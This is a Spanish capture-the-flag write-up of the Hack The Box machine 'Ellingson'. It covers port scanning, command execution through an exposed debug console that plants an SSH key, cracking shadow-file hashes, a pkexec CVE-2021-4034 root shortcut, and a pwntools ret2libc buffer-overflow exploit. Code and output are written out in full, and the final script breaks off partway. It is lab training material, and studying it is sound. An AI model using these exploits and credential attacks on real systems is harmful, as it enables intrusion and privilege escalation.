---
layout: post
title: Ellingson
date: 2023-03-03
description:
img:
fig-caption:
tags: [OSCP]
---
___

<center><img src="/writeups/assets/img/Ellingson-htb/Ellingson.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.139 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 09:35 GMT
Nmap scan report for 10.10.10.139
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.29 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.10.139 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 09:36 GMT
Nmap scan report for 10.10.10.139
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49e8f12a8062de7e0240a1f430d288a6 (RSA)
|   256 c802cfa0f2d85d4f7dc7660b4d5d0bdf (ECDSA)
|_  256 a5a995f54af4aef8b63792b89a2ab466 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.72 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.139
http://10.10.10.139 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.10.139], RedirectLocation[http://10.10.10.139/index], Title[301 Moved Permanently], nginx[1.14.0]
http://10.10.10.139/index [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.10.139], JQuery, Script, Title[Ellingson Mineral Corp], nginx[1.14.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Ellingson-htb/1.png" alt="">

En un artículo aparecen las contraseñas que son más comunes (Por la cara)

<img src="/writeups/assets/img/Ellingson-htb/2.png" alt="">

A través de un error, es posible llegar a ejecutar comandos abusando del ```/console``` expuesto

<img src="/writeups/assets/img/Ellingson-htb/3.png" alt="">

No tengo conectividad con mi equipo

<img src="/writeups/assets/img/Ellingson-htb/4.png" alt="">

Me traigo la ```id_rsa``` a mi equipo

Está protegido por contraseña, y no se encuentra en el ```rockyou.txt``` y las contraseñas de antes tampoco son válidas

```null
Love
Secret
Sex
God
love
secret
sex
god
```

```null
john -w:/home/rubbx/Desktop/HTB/Machines/Ellingson/dictionary.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2023-03-03 09:58) 0g/s 800.0p/s 800.0c/s 800.0C/s Love..god
Session completed. 
```

Meto mi clave pública en las ```authorized_keys```

```null
>>> print(os.popen("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCg2wqk04UvXxDEQ87iHMrQxQDv5JoCDDahKQ3TcMG7RPCucDtKH8HiwB1SZq0MCmUcjvfGCIMytpJRINRFIQiY4Ui0YV9rE7F+/o8Q8CIvlWZLWXiqBX2bqp16hgpOARGLUmKTOvz5dJggN7FIYcdKkRCeD08nNDhLaRDJozvlhS0DT/UOQ6MvMSIVl/7i+2BZTA4KsLo4ttM918cwd7ettkhyAwgzWZ+MnB9SxQuHgwg9eY0yNqE4/Cm3w0ihufE3sEXO50qeQZfR7VUjvRDjpXRyShILYKshtcnZULC7ySjXMaeQUUFHEQTU1OiwV44Jy055duOBgBEm1gFyTKb9cQ72ierzwPk/CUbuJVarpDQiwb1u9w050xmxecvHfP4/nGno2/Y6VUNZxRp0jB6Va1N5YWvSVlJ8isgIYfFnGR1GkZP6vmjkxGwOb8Pg9BT8R5bD4cLg+XlDeACO1QSkZEjFmZ2+/2+boRxpW9aICSqF5xyR/0CscbVkx2og5wc= root@kali' > /home/hal/.ssh/authorized_keys").read())
```

Me puedo conectar sin proporcionar contraseña

```null
sh hal@10.10.10.139
The authenticity of host '10.10.10.139 (10.10.10.139)' can't be established.
ED25519 key fingerprint is SHA256:/Ts0zZ43fYETFeu5W2ad2+XUrqVy6hlzlXZcobf3cmA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.139' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  3 10:01:53 UTC 2023

  System load:  0.0               Processes:             157
  Usage of /:   64.5% of 4.31GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.10.10.139
  Swap usage:   0%

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

159 packages can be updated.
78 updates are security updates.


Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
hal@ellingson:~$   
```

Estoy en el grupo ```adm```, por lo que puedo listar los LOG

```null
hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
```

```null
hal@ellingson:/$ find \-group adm 2>/dev/null 
./var/backups/shadow.bak
./var/spool/rsyslog
./var/log/auth.log
./var/log/mail.err
./var/log/fail2ban.log
./var/log/kern.log
./var/log/syslog
./var/log/nginx
./var/log/nginx/error.log
./var/log/nginx/access.log
./var/log/cloud-init.log
./var/log/unattended-upgrades
./var/log/apt/term.log
./var/log/apport.log
./var/log/mail.log
./snap/core/6405/var/log/dmesg
./snap/core/6405/var/log/fsck/checkfs
./snap/core/6405/var/log/fsck/checkroot
./snap/core/6405/var/spool/rsyslog
./snap/core/4917/var/log/dmesg
./snap/core/4917/var/log/fsck/checkfs
./snap/core/4917/var/log/fsck/checkroot
./snap/core/4917/var/spool/rsyslog
./snap/core/6818/var/log/dmesg
./snap/core/6818/var/log/fsck/checkfs
./snap/core/6818/var/log/fsck/checkroot
./snap/core/6818/var/spool/rsyslog
```

Uno de ellos corresponde a una copia del ```/etc/shadow```

```null
hal@ellingson:/$ cat /var/backups/shadow.bak
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

Me quedo con los hashes para intentar crackearlos desde mi máquina windows host

```null
cat /usr/share/wordlists/rockyou.txt | grep -Ei 'love|secret|sex|god' > dictionary
```

```null
usuario@DESKTOP-5MC9541 C:\Users\Usuario\Documents\hashcat-6.2.6>hashcat y:\hashes y:\dictionary --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:password123
$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:iamgod$08
```

Me puedo conectar como ```margo```

```null
sh margo@10.10.10.139
margo@10.10.10.139's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  3 10:45:22 UTC 2023

  System load:  0.0               Processes:             162
  Usage of /:   65.1% of 4.31GB   Users logged in:       1
  Memory usage: 28%               IP address for ens160: 10.10.10.139
  Swap usage:   0%

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

159 packages can be updated.
78 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jul 16 09:11:58 2021
margo@ellingson:~$
```

Puedo ver la primera flag

```null
margo@ellingson:~$ cat user.txt 
02d6632e4855e8a2ec8e11b1506cee3d
```

# Escalada (No intencionada)

Se puede abusar del ```pkexec```. pero no es la idea. No hagais trampa chaveles :(

```null
margo@ellingson:/tmp$ ./pkowner.sh 
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment...
[+] Build offensive gconv shared module...
[+] Build mini executor...
root@ellingson:/tmp# whoami
root
```

# Escalada

Listo los permisos SUID

```null
margo@ellingson:/$ find \-perm \-4000 2>/dev/null | grep -v snap
./usr/bin/at
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/garbage
./usr/bin/newuidmap
./usr/bin/sudo
./usr/bin/traceroute6.iputils
./usr/bin/chfn
./usr/bin/newgidmap
./usr/bin/chsh
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./bin/su
./bin/umount
./bin/ntfs-3g
./bin/ping
./bin/mount
./bin/fusermount
```

Uno de ellos no es habitual

```null
margo@ellingson:/$ ./usr/bin/garbage
Enter access password:
```

Lo transfiero a mi equipo para debuggearlo. Desde ```Ghidra``` se puede ver la contraseña hardcodeada

```null
./garbage
Enter access password: N3veRF3@r1iSh3r3!

access granted.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
> 
```

Es vulnerable a BOF

```null
gef➤  r
Starting program: /home/rubbx/Desktop/HTB/Machines/Ellingson/garbage 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

 Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x007fffffffe7e8  →  0x007fffffffea98  →  "/home/rubbx/Desktop/HTB/Machines/Ellingson/garbage"
$rcx   : 0x007ffff7ec0190  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffe6b8  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9ca10  →  0x0000000000000000
$rip   : 0x00000000401618  →  <auth+261> ret 
$r8    : 0x00000000406a2b  →  ":113::/var/run/redsocks:/usr/sbin/nologin\nrwhod:x[...]"
$r9    : 0x0               
$r10   : 0x007ffff7dd1fd8  →  0x10002200006647 ("Gf"?)
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffe7f8  →  0x007fffffffeacb  →  "LANGUAGE=en_US:en"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe6b8│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $rsp
0x007fffffffe6c0│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe6c8│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe6d0│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe6d8│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe6e0│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe6e8│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffe6f0│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40160d <auth+250>       call   0x401050 <puts@plt>
     0x401612 <auth+255>       mov    eax, 0x0
     0x401617 <auth+260>       leave  
 →   0x401618 <auth+261>       ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "garbage", stopped 0x401618 in auth (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401618 → auth()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Cuenta con varias protecciones. El NX está habilitado, por lo que tiene Data Execution Prevention y no puedo cargar shellcode en el stack

```null
gef➤  checksec
[+] checksec for '/home/rubbx/Desktop/HTB/Machines/Ellingson/garbage'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Se puede intentar efectuar un ```lib2libc```. El problema está en que el ASLR está habilitado, por lo que las direcciones son dinámicas y al ser de 64 bits no se puede aplicar fuerza bruta para encontrar una colisión tomando una como base

Con ```ldd``` listo las librerías compartidas del binario

```null
margo@ellingson:/$ ldd /usr/bin/garbage 
	linux-vdso.so.1 (0x00007ffebb7e8000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd1ce869000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fd1cec5a000)
```

Con ```scp``` me la traigo a mi equipo, ya que es demasiado grande como para transformarla a base64

```null
scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 .
```

Calculo el offset

```null
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
[+] Saved as '$_gef0'
```

```null
gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search) 
``` 

Compruebo que es correcto

```null
python3 -c 'print("A"*136+"B"*8)' | xclip -sel clip
```

```null
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x007fffffffe7e8  →  0x007fffffffea98  →  "/home/rubbx/Desktop/HTB/Machines/Ellingson/garbage"
$rcx   : 0x007ffff7ec0190  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffe6b8  →  "BBBBBBBB"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9ca10  →  0x0000000000000000
$rip   : 0x00000000401618  →  <auth+261> ret 
$r8    : 0x00000000406971  →  "/lib/tpm:/bin/false\nstrongswan:x:105:65534::/var/[...]"
$r9    : 0x0               
$r10   : 0x007ffff7dd1fd8  →  0x10002200006647 ("Gf"?)
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffe7f8  →  0x007fffffffeacb  →  "LANGUAGE=en_US:en"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe6b8│+0x0000: "BBBBBBBB"	← $rsp
0x007fffffffe6c0│+0x0008: 0x0000000000000000
0x007fffffffe6c8│+0x0010: 0x00000000f7ffdad0
0x007fffffffe6d0│+0x0018: 0x0000000000000001
0x007fffffffe6d8│+0x0020: 0x007ffff7def18a  →  <__libc_start_call_main+122> mov edi, eax
0x007fffffffe6e0│+0x0028: 0x007fffffffe7d0  →  0x007fffffffe7d8  →  0x00000000000038 ("8"?)
0x007fffffffe6e8│+0x0030: 0x00000000401619  →  <main+0> push rbp
0x007fffffffe6f0│+0x0038: 0x00000100400040 ("@"?)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40160d <auth+250>       call   0x401050 <puts@plt>
     0x401612 <auth+255>       mov    eax, 0x0
     0x401617 <auth+260>       leave  
 →   0x401618 <auth+261>       ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "garbage", stopped 0x401618 in auth (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401618 → auth()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Creo un script en python para automatizar todo el BOF. Para poder leakear la dirección de libc se pueden utilizar gadgets

```null
from pwn import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
ip = "10.10.10.139"

def makeConnection():

    r = ssh(host=ip, user='margo', password='iamgod$08')
    p = r.process("/usr/bin/garbage")

    elf = ELF("./garbage")
    libc = ELF("./libc.so.6")
    rop = ROP(elf)


if __name__ == '__main__':
    makeConnection()
```

```null
python3 exploit.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process bytearray(b'/usr/bin/garbage') on 10.10.10.139: pid 1822
[*] '/home/rubbx/Desktop/HTB/Machines/Ellingson/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/rubbx/Desktop/HTB/Machines/Ellingson/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './garbage'
```

Cuenta con 14 gadgets. Aprovechandome de un error puedo intentar leakear la dirección base de libc. Se puede hacer, entre muchas otras formas, con la función puts. El orden de los registros de los binarios compilados de linux en 64 bits es ```rdi, rsi, rdx, rcx, r8, r9```. En caso de que uno de estos gadgets sea un ```pop rdi, ret```, podría meter en ese registro lo que yo quisiera. La idea final consiste en leer de ```rdi``` el valor de ```__libc_main_start```

```null
from pwn import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
ip = "10.10.10.139"

def leaked_libc(p, elf, libc, rop):

    # rdi, rsi, rdx, rcx, r8, r9

    # PUTS() -> rdi -> __libc_main_start -> PUTS(__libc_main_start)

    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

    log.info("pop rdi: %s" % hex(pop_rdi))

if __name__ == '__main__':

    r = ssh(host=ip, user='margo', password='iamgod$08')
    p = r.process("/usr/bin/garbage")

    elf = ELF("./garbage")
    libc = ELF("./libc.so.6")
    rop = ROP(elf)

    leaked_libc = leaked_libc(p, elf, libc, rop)
```

```null
[*] Loaded 14 cached gadgets for './garbage'
[*] pop rdi: 0x40179b
```

Para evitar que el programa colapse y poder seguir realizando operatorias, es necesario traerse el ```main``` para que el flujo del programa continúe con normalidad

```null
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
libc = elf.symbols["__libc_start_main"]
main = elf.symbols["main"]
puts = elf.plt["puts"]

log.info("pop rdi: %s" % hex(pop_rdi))
log.info("libc: %s" % hex(libc))
log.info("main: %s" % hex(main))
log.info("puts: %s" % hex(puts))
```

```null
[*] Loaded 14 cached gadgets for './garbage'
[*] pop rdi: 0x40179b
[*] libc: 0x403ff0
[*] main: 0x401619
[*] puts: 0x401050
```

Defino el payload, cargo la dirección que hace un ```pop rdi``` y a rdi la dirección de libc para hacer una llamada a ```puts```. Como en ```rdi``` está almacenado el valor de libc, lo va a leer porque es el primer registro según el convenio y puts va a leakear la dirección base de libc. Para que el programa no colapase, le añado la función de ```main``` al final

```null
log.info("pop rdi: %s" % hex(pop_rdi))
log.info("libc: %s" % hex(libc))
log.info("main: %s" % hex(main))
log.info("puts: %s" % hex(puts))

offset = 136
junk = b"A"*offset

payload = junk + p64(pop_rdi) + p64(libc) + p64(puts) + p64(main)

p.recvuntil(b"Enter access password:")
p.sendline(payload)

p.recvline()
p.recvline()
leaked_libc = p.recvline()
leaked_libc = leaked_libc.strip()

log.info("leaked_libc: %s" % leaked_libc)
```

```null
[*] Loaded 14 cached gadgets for './garbage'
[*] pop rdi: 0x40179b
[*] libc: 0x403ff0
[*] main: 0x401619
[*] puts: 0x401050
[*] leaked_libc: b'\xb0*\x01H\xab\x7f'
```

Ahora necesito calcular la dirección real de ```libc```, ya que esta es la base

```null
from pwn import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
ip = "10.10.10.139"

def leaked_libc(p, elf, libc, rop):

    # rdi, rsi, rdx, rcx, r8, r9

    # PUTS() -> rdi -> __libc_main_start -> PUTS(__libc_main_start)

    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
    libc = elf.symbols["__libc_start_main"]
    main = elf.symbols["main"]
    puts = elf.plt["puts"]

    log.info("pop rdi: %s" % hex(pop_rdi))
    log.info("libc: %s" % hex(libc))
    log.info("main: %s" % hex(main))
    log.info("puts: %s" % hex(puts))

    offset = 136
    junk = b"A"*offset

    payload = junk + p64(pop_rdi) + p64(libc) + p64(puts) + p64(main)

    p.recvuntil(b"Enter access password:")
    p.sendline(payload)

    p.recvline()
    p.recvline()
    leaked_libc = p.recvline()
    leaked_libc = u64(leaked_libc.strip().ljust(8, b"\x00"))

    log.info("leaked_libc: %s" % hex(leaked_libc))

    return leaked_libc

if __name__ == '__main__':

    r = ssh(host=ip, user='margo', password='iamgod$08')
    p = r.process("/usr/bin/garbage")

    elf = ELF("./garbage")
    libc = ELF("./libc.so.6")
    rop = ROP(elf)

    leaked_libc = leaked_libc(p, elf, libc, rop)

    libc.address = leaked_libc - libc.sym["__libc_start_main"]

    log.info("[!] Dirección real %s" % hex(libc.address))
```

Ahora el añado una nueva función que se encargue de ejecutar una ```/bin/sh```, cargando la instrucción a rdi para cargarla a la función ```system()``` y de nuevo utilizando un gadget que se encargue de hacer un ```pop rdi, ret```. Debido a varios problemas, he tenido que usar el gadget ```ret``` para poder ejecutar comandos. Además la primera coincidencia que encontraba con ```/bin/sh``` no era válida, por lo que había que saltar a la siguiente


Finalmente, quedaría de la siguiente forma:

```null
from pwn import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
ip = "10.10.10.139"

offset = 136
junk = b"A"*offset

def leaked_libc(p, elf, libc, rop):

    # rdi, rsi, rdx, rcx, r8, r9

